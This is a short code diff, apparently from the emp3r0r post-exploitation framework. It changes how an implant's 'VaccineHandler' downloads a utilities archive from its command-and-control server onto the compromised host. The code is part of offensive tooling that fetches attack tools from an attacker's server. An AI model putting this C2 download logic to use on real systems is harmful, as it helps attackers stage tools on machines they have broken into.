@@ -38,7 +38,7 @@ func VaccineHandler() (out string) {
 	)
 
 	log.Printf("Downloading utils from %s", emp3r0r_data.CCAddress+"www/utils.tar.bz2")
-	_, err := DownloadViaCC(emp3r0r_data.CCAddress+"www/utils.tar.bz2", RuntimeConfig.AgentRoot+"/utils.tar.bz2")
+	_, err := DownloadViaCC("utils.tar.bz2", RuntimeConfig.AgentRoot+"/utils.tar.bz2")
 	out = "[+] Utils have been successfully installed"
 	if err != nil {
 		log.Print("Utils error: " + err.Error())
